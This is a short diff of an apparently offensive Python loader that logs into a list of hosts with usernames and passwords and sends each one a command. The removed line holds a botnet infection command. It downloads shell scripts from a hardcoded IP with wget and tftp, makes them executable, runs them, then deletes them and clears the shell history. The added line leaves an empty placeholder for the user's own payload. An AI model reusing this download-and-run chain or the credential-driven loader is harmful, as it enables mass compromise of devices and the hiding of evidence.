@@ -4,7 +4,7 @@ from threading import Thread
 if len(sys.argv) < 2:
 	sys.exit("\033[37mUsage: python "+sys.argv[0]+" [list]")
 
-cmd="cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://188.130.138.39/Sakura.sh; chmod 777 *; sh Sakura.sh; tftp -g 188.130.138.39 -r tftp1.sh; chmod 777 *; sh tftp1.sh; rm -rf *.sh; history -c" #command to send
+cmd=" " #command to send # you payload
 info = open(str(sys.argv[1]),'a+')
 
 def sqwad(ip,username,password):
